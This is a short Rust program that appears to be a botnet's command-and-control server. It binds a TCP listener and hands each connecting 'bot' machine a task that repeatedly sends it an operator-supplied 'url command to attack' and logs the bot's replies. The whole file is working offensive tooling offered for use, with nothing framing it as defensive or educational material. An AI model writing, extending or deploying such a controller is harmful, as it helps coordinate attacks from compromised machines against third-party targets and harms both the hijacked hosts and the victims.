use std::net::SocketAddr;
use std::sync::Arc;

use clap::Parser;
use tokio::net::{TcpListener, TcpStream};
use tokio::io::{AsyncReadExt, AsyncWriteExt};

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    // ip: the server ip
    #[arg(short, long)]
    ip: String,

    // port: the port where own server will be running
    #[arg(short, long)]
    port: u16,

    // command: url command to attack it.
    #[arg(short, long)]
    command: String,
}

// handler the connection with bot machine
async fn handler_connection(mut socket: TcpStream, addr: SocketAddr, command: String) {
    let mut buffer = [0u8;1024]; 

    loop {
        // send the command to all bots
        if let Err(e) = socket.write_all(command.as_bytes()).await {
            eprintln!("{:?}", e);
        };

        // reading the info of the bots
        let n = socket.read(&mut buffer).await.unwrap();
        let data = String::from_utf8_lossy(&buffer[..n]);

        // print the data
        println!("[MESSAGE] [{}] => {}", addr, data);
    }
}
#[tokio::main]
async fn main() {
    // parsing the agruments
    let args = Args::parse();

    // parse the direcction addrs
    let addr = format!("{}:{}", args.ip, args.port);

    // arc of args.command
    let command_arc = Arc::new(args.command);

    // init the server 
    let listener = match TcpListener::bind(addr).await {
        Ok(listener) => {
            println!("the server is running...");
            listener
        },
        Err(e) => {
            eprintln!("{:?}", e);
            return;
        }
    };

    loop {
        match listener.accept().await {
            Ok((socket, addr)) => {
                println!("[CONNECTION] [{}] => has connected successfuly", addr);

                // copy the command from the arc
                let command = Arc::clone(&command_arc);

                tokio::spawn(async move {
                    handler_connection(socket, addr, command.to_string()).await;
                });
            },
            Err(e) => {
                eprintln!("{:?}", e);
            }
        }
    }
}